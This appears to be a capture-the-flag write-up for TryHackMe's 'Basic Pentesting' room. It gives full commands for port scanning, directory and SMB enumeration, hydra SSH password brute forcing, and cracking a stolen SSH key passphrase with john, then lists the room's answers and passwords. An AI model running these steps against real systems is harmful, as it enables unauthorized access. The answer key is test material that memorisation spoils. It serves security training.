# [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)

## Task 1: Web App Testing and Privilege Escalation

>In these set of tasks you'll learn the following:\
- brute forcing
- hash cracking
- service enumeration
- Linux Enumeration

First do the enumeration with nmap
```
ip=10.10.66.143
ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports $ip
```
**Output:**
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m05s, deviation: 2h18m34s, median: 5s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2021-06-24T02:38:38-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-06-24T06:38:38
|_  start_date: N/A
```
Find the hidden directory using `gobuster`
```
gobuster -u http://$ip:80 -w /usr/share/wordlists/dirb/common.txt -x xxa dir
```
So we got a hidden directory development\
Lets run `enum4linux` and see if we can get anything more.
```
enum4linux $ip
```
We got the two users `Jan` and `kay`

Now to brute force the password let use `hydra`
```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://$ip
```
So the password is 'armando' for 'jan'.\
Logging in  through the credentials.

Hint: Use a privilege escalation checklist or tool like LinEnum\
Download the LinEnum and upload it to the victim /tmp directory(on other directories it will not be allowed). Run the `./LinEnum.sh`(You can also use `linpeas`)

We got private key for 'kay' which is readable. Lets copy this to attack machine and name the file `kay_idrsa`.\
Before Logging in with the private key we have to crack its passphrase. For this we pass the keys to `ssh2john.py` and then crack it with `john` using rockyou.txt
```
/usr/share/john/ssh2john.py kay_idrsa > ssh2john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ssh2john.txt
```
The passphrase is 'beeswax'\
Log in now with the private keys
```
chmod 600 kay_idrsa
ssh -i kay_idrsa kay@10.10.254.122
```
Get the final flag at `pass.bak`


- What is the name of the hidden directory on the web server(enter name without /)?

  development
- What is the username?

  jan
- What is the password?

  armando
- What service do you use to access the server(answer in abbreviation in all caps)?

  SSH
- What is the name of the other user you found(all lower case)?

  Kay
- What is the final password you obtain?

  heresareallystrongpasswordthatfollowsthepasswordpolicy
